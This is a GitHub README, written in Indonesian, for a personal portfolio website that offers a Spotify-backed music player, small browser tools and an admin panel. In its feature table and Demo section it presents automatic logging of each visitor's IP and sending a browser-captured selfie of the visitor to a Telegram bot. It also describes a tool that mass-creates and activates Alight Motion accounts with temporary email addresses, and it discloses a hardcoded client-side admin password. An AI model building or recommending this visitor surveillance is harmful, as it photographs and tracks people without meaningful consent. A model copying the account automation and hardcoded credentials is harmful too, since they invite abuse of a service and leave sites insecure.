<div align="center">

```text
▗▄▄▖  ▗▄▖ ▗▄▄▖ ▗▄▄▄▖ ▗▄▖ ▗▄▄▄▖ ▗▄▖ ▗▖    ▄▄▄  ▗▄▖
▐▛▀▜▖ █▀█ ▐▛▀▜▌▝▀█▀▘ █▀█ ▐▛▀▀▘ █▀█ ▐▌    ▀█▀  █▀█
▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌  █  ▐▌ ▐▌▐▌   ▐▌ ▐▌▐▌     █  ▐▌ ▐▌
▐██▛ ▐▌ ▐▌▐███   █  ▐▌ ▐▌▐███ ▐▌ ▐▌▐▌     █  ▐▌ ▐▌
▐▌   ▐▌ ▐▌▐▌▝█▖  █  ▐▌ ▐▌▐▌   ▐▌ ▐▌▐▌     █  ▐▌ ▐▌
▐▌    █▄█ ▐▌ ▐▌  █   █▄█ ▐▌    █▄█ ▐▙▄▄▖ ▄█▄  █▄█
▝▘    ▝▀▘ ▝▘ ▝▀  ▀   ▝▀▘ ▝▘    ▝▀▘ ▝▀▀▀▘ ▀▀▀  ▝▀▘
```

</div>

<h2 align="center">🎧 Music · Streaming · 🎬 Tools · 🔐 Admin</h2>

<p align="center">
  <img alt="Version" src="https://img.shields.io/badge/version-3.1.0-8b5cf6.svg?style=for-the-badge&logo=vercel" />
  <a href="https://yandev.my.id" target="_blank">
    <img alt="Live Demo" src="https://img.shields.io/badge/LIVE_DEMO-yandev.my.id-00c853.svg?style=for-the-badge&logo=vercel" />
  </a>
  <img alt="License" src="https://img.shields.io/badge/License-MIT-a855f7.svg?style=for-the-badge" />
  <img alt="Theme" src="https://img.shields.io/badge/Theme-Neon_Purple-6366f1.svg?style=for-the-badge" />
  <img alt="Last commit" src="https://img.shields.io/github/last-commit/TheyanzXD/Portofolio-yanzxd?style=for-the-badge" />
</p>

<p align="center">
  💜 Portfolio personal tema ungu neon — lengkap dengan music player, tools Alight Motion, IP tracking + notifikasi Telegram, dan mini tools interaktif.
</p>

---

## ✨ Fitur Utama

| Kategori | Fitur |
|----------|-------|
| 🎧 **Music Player** | Streaming Spotify: cari lagu, putar/pause, progress bar, download otomatis, shortcut keyboard (Spasi, Ctrl+K, Esc) |
| 🎬 **Alight Motion** | Auto create email + inbox, kirim verifikasi, aktivasi akun (3 langkah) |
| 📊 **Tracking** | IP logging, visitor dashboard (admin panel /yanz/pengunjung.html) |
| 📸 **Kamera** | Selfie langsung dari browser → dikirim ke Telegram Bot |
| 🛠 **Tools** | Kalkulator, stopwatch, konversi suhu, random picker, tebak angka, quotes |
| 🎨 **Desain** | Tema gelap ungu neon (Inter, Font Awesome 6), responsif mobile 320px+ |

---

## 🚀 Demo

> **Live:** [yandev.my.id](https://yandev.my.id) — bagian **Music Player** & **Alight Motion Tools**

Pengunjung akan otomatis:
- 📍 IP dicatat ke dashboard admin
- 📸 Foto selfie dikirim ke Telegram Bot
- 🎵 Lagu favorit & player tersedia langsung di halaman

---

## 🛠 Tech Stack

```text
Frontend  → HTML5 · CSS3 · Vanilla JS (IIFE) · Font Awesome 6 · Google Font
Backend   → Node.js serverless (Vercel Functions)
Deploy    → Vercel (GitHub auto-deploy)
Integrasi → Telegram Bot API · Spotify API · API HaidarXD (ai.haidarxd.my.id)
```

---

## 📁 Struktur

```text
.
├── index.html            # Halaman utama (Music Player + tools grid)
├── yanz/                 # Semua halaman tools
│   ├── alight.html       # Alight Motion Tools (auto/send/verify)
│   ├── kalkulator.html   # Kalkulator
│   ├── konversi-suhu.html# Konversi suhu
│   ├── pengunjung.html   # Admin panel (visitor log)
│   ├── quotes.html       # Random quotes
│   ├── random-picker.html# Random picker
│   ├── stopwatch.html    # Stopwatch
│   └── tebak-angka.html  # Game tebak angka
├── api/                  # Backend serverless (Telegram / IP tracking)
│   ├── index.js          # Vercel entry point
│   └── server.js         # API handlers (track-ip, send-selfie, send-telegram)
├── data/
│   └── playlist.json     # Daftar lagu favorit
├── ui/
│   └── style.css         # Global styles (tema ungu neon)
├── vercel.json           # Vercel config
└── LICENSE
```

---

## 🎧 Music Player

Streaming langsung dari Spotify via API **api.haidarxd.my.id**.

```text
Search   → GET /api/v1/spotify/search?q={query}&limit=6&apikey={key}
Download → GET /api/v1/downloader/spotify?url={url}&index=1&apikey={key}
```

- Default lagu: **Secukupnya – Hindia**
- Cari → klik hasil → download & putar otomatis
- Progress bar bisa diklik & drag (pointer events)
- Shortcut: `Spasi` (play/pause) · `Ctrl+K`/`Cmd+K` (fokus search) · `Esc` (tutup hasil)

> ⚠️ URL download bersifat sementara (expired) — diambil ulang setiap kali lagu dipilih.

---

## 🎬 Alight Motion Tools

Akses di **/yanz/alight.html**. Tiga langkah aktivasi:

1. **Auto Create** → dapat email temporer + inbox URL (berlaku 1 tahun)
2. **Kirim Verifikasi** → kirim link ke email
3. **Aktivasi** → tempel email + link, aktifkan akun

Tombol **"Buka Inbox Temp Mail"** membuka halaman inbox secara manual, contoh:
`https://tempmailhaidar.vercel.app/{email@domain}`

```text
Auto   → GET /api/v1/alight-motion/auto
Send   → GET /api/v1/alight-motion/send?email={email}
Verify → GET /api/v1/alight-motion/verify?email={email}&link={link}
```

> Semua endpoint butuh `apikey` → `haidarapis-...` (public demo key, terpasang di client).

---

## 🔐 Admin Panel

Akses: **/yanz/pengunjung.html**
- Login (password di client `devcode`)
- Statistik pengunjung (total, hari ini, lagu, tools)
- Tabel visitor + search + export CSV
- Kelola playlist & database

> ⚠️ Data visitor tidak persisten di Vercel (ephemeral `/tmp`).

---

## ☁️ Deploy (Vercel)

Repo ini auto-deploy via GitHub → Vercel.

```bash
git clone https://github.com/TheyanzXD/Portofolio-yanzxd.git
cd Portofolio-yanzxd
```

Masukkan env vars di **Vercel → Settings → Environment Variables**:

```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
```

> **Cara dapat token:** buka [@BotFather](https://t.me/BotFather) → `/newbot` → copy token.
> Tanpa env ini, fitur Telegram otomatis dilewati (tidak error).

---

## ⚠️ Known Issues

- Visitor data ephemeral di Vercel (disimpan ke `/tmp`)
- Password admin hardcoded di client-side (untuk produksi gunakan auth server-side)
- Tidak ada rate limiting API eksternal

---

## 👤 Author

**@TheyanzXD**

| Platform | Link |
|----------|------|
| Website | [yandev.my.id](https://yandev.my.id) |
| GitHub | [@TheyanzXD](https://github.com/TheyanzXD) |
| Twitter | [@yanzxd](https://twitter.com/yanzxd) |
| LinkedIn | [@muhammadizyan](https://linkedin.com/in/muhammadizyan) |

---

## 📄 License

Distributed under the **MIT License**. Lihat [LICENSE](LICENSE).

---

<p align="center">
  💜 Dibuat dengan ❤️ oleh <b>YanzXD</b> — The Coders
</p>
